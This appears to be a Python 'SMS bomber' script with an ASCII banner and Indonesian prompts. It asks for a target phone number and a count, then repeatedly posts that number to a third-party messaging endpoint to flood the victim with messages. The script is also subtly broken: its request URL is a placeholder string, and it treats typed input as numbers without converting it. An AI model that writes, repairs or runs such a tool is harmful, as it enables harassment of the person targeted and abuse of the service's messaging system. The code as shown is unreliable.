import requests

def start():
    spanduk = "\n   ______  __________             __          \n  / __/  |/  / __/ _ )___  __ _  / /  ___ ____\n _\ \/ /|_/ /\ \/ _  / _ \/  ' \/ _ \/ -_) __/\n/___/_/  /_/___/____/\___/_/_/_/_.__/\__/_/   \n"
    print(spanduk)

def hajar(nope):
    BASE = "PC Me"
    head = {"LANG":"en", "Content-Type":"application/json; charset=UTF-8", "Content-Length":"44", "Host":"phr.gms.digital", "Connection":"close"}
    body = {"memberToken":"", "receivers":str(nope)}
    
    otw = requests.post(url=BASE, json=body, headers=head)
    jasjus = otw.json()
    if jasjus['status'] == True:
        print("[SUCCESS]> Send To "+ str(nope))
    else:
        print("[FAILED]> Send To "+ str(nope))
    otw.close()

start()
nomor = 0
while(nomor == 0):
    try:
        nomor = input("[INPUT]> Nomor : 0")
    except:
        print("[ERROR]> Masukan Hanya Nomor")
jumlah = 0
while(jumlah == 0):
    try:
        jumlah = input("[INPUT]> Jumlah :")
    except:
        print("[FAILED]> Masukan Hanya Angka")
if jumlah <= 0:
    print("[INFO]> Jumlah di Set ke 1")
    jumlah = 1
for love in range(jumlah):
    hajar(nomor)
print("[INFO]> Bot Stoped")
